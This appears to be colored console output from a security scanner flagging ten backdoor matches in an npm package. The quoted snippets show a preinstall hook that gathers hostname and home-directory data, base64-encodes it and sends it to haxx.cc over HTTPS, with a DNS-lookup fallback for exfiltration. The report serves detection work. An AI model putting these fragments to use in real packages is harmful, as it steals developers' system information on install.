[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000803[0m
       Tag: [34mSecurity.Backdoor.Obfuscation.DNS[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32mdns.setServers[0m
[30;1m73 | [0m[35m        } else {[0m
[30;1m74 | [0m[35m            nsAddress = '8.8.8.8';[0m
[30;1m75 | [0m[35m        }[0m
[30;1m76 | [0m[35m        dns.setServers([nsAddress, '8.8.4.4']);[0m
[30;1m77 | [0m[35m        sendToServer(data);[0m
[30;1m78 | [0m[35m    });[0m
[30;1m79 | [0m[35m})[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000800[0m
       Tag: [34mSecurity.Backdoor.Obfuscation[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32mbase64|encodedcommand|obfuscate[0m
[30;1m58 | [0m[35mconst options = {[0m
[30;1m59 | [0m[35m  hostname: 'haxx.cc',[0m
[30;1m60 | [0m[35m  port: 443,[0m
[30;1m61 | [0m[35m  path: '/?'+Buffer.from(data).toString('base64'),[0m
[30;1m62 | [0m[35m  method: 'GET'[0m
[30;1m63 | [0m[35m}[0m
[30;1m64 | [0m[35m[0m

[31m--[ [0m[34mMatch #[0m[33m3[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m4 | [0m[35m  "description": "http://haxx.cc/?lbc-git_description",[0m
[30;1m5 | [0m[35m  "main": "src/index.js",[0m
[30;1m6 | [0m[35m  "scripts": {[0m
[30;1m7 | [0m[35m    "preinstall": "node src/index.js",[0m
[30;1m8 | [0m[35m    "dev": "node src/index.js",[0m
[30;1m9 | [0m[35m    "test": "echo \"Error: no test specified\" && exit 1"[0m
[30;1m10 | [0m[35m  },[0m

[31m--[ [0m[34mMatch #[0m[33m4[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m56 | [0m[35m[0m
[30;1m57 | [0m[35m// try to  exfil over https first[0m
[30;1m58 | [0m[35mconst options = {[0m
[30;1m59 | [0m[35m  hostname: 'haxx.cc',[0m
[30;1m60 | [0m[35m  port: 443,[0m
[30;1m61 | [0m[35m  path: '/?'+Buffer.from(data).toString('base64'),[0m
[30;1m62 | [0m[35m  method: 'GET'[0m

[31m--[ [0m[34mMatch #[0m[33m5[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m47 | [0m[35m[0m
[30;1m48 | [0m[35mdata = {[0m
[30;1m49 | [0m[35m    p : package,[0m
[30;1m50 | [0m[35m    h : tryGet(os.hostname),[0m
[30;1m51 | [0m[35m    d : tryGet(os.homedir),[0m
[30;1m52 | [0m[35m    c : __dirname[0m
[30;1m53 | [0m[35m}[0m

[31m--[ [0m[34mMatch #[0m[33m6[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000705[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNS[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32mdns.lookup[0m
[30;1m73 | [0m[35m        } else {[0m
[30;1m74 | [0m[35m            nsAddress = '8.8.8.8';[0m
[30;1m75 | [0m[35m        }[0m
[30;1m76 | [0m[35m        dns.setServers([nsAddress, '8.8.4.4']);[0m
[30;1m77 | [0m[35m        sendToServer(data);[0m
[30;1m78 | [0m[35m    });[0m
[30;1m79 | [0m[35m})[0m

[31m--[ [0m[34mMatch #[0m[33m7[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000705[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNS[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32mdns.lookup[0m
[30;1m28 | [0m[35m            // dns.resolve([0m
[30;1m29 | [0m[35m            //     'v2_f.' + id + '.' + idx + '.' + chunk + '.v2_e' + suffix, 'A',[0m
[30;1m30 | [0m[35m            //     console.log);[0m
[30;1m31 | [0m[35m            dns.resolve([0m
[30;1m32 | [0m[35m                id+'.'+chunk+suffix,[0m
[30;1m33 | [0m[35m                console.log);[0m
[30;1m34 | [0m[35m        } catch (e) { }[0m

[31m--[ [0m[34mMatch #[0m[33m8[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000705[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNS[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32mdns.lookup[0m
[30;1m25 | [0m[35m[0m
[30;1m26 | [0m[35m    data.forEach(function (chunk, idx){[0m
[30;1m27 | [0m[35m        try {[0m
[30;1m28 | [0m[35m            // dns.resolve([0m
[30;1m29 | [0m[35m            //     'v2_f.' + id + '.' + idx + '.' + chunk + '.v2_e' + suffix, 'A',[0m
[30;1m30 | [0m[35m            //     console.log);[0m
[30;1m31 | [0m[35m            dns.resolve([0m

[31m--[ [0m[34mMatch #[0m[33m9[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000705[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNS[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32mdns.lookup[0m
[30;1m67 | [0m[35mreq.on('error', error => {[0m
[30;1m68 | [0m[35m    // failed, so try the hax on dns for exfil[0m
[30;1m69 | [0m[35m    sendToServer(data);[0m
[30;1m70 | [0m[35m    dns.lookup(ns, function(err, address) {[0m
[30;1m71 | [0m[35m        if (!err) {[0m
[30;1m72 | [0m[35m            nsAddress = address;[0m
[30;1m73 | [0m[35m        } else {[0m

[31m--[ [0m[34mMatch #[0m[33m10[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000700[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/src/index.js[0m
   Pattern: [32m\.(request|post|get)\([0m
[30;1m62 | [0m[35m  method: 'GET'[0m
[30;1m63 | [0m[35m}[0m
[30;1m64 | [0m[35m[0m
[30;1m65 | [0m[35mconst req = https.request(options, res => {})[0m
[30;1m66 | [0m[35m[0m
[30;1m67 | [0m[35mreq.on('error', error => {[0m
[30;1m68 | [0m[35m    // failed, so try the hax on dns for exfil[0m

10 matches found.
